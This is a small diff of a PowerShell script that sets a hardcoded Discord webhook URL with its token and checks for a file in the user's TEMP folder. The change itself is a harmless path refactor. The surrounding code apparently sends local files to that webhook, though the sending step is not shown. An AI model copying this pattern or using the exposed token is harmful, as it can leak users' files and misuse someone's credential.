@@ -6,7 +6,7 @@ param(
 $webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
 
 # Define the path to the text file using the TEMP environment variable
-$filePath = "$env:TEMP\$filename"
+$filePath = Join-Path $env:TEMP $filename
 
 # Check if the file exists
 if (Test-Path $filePath) {
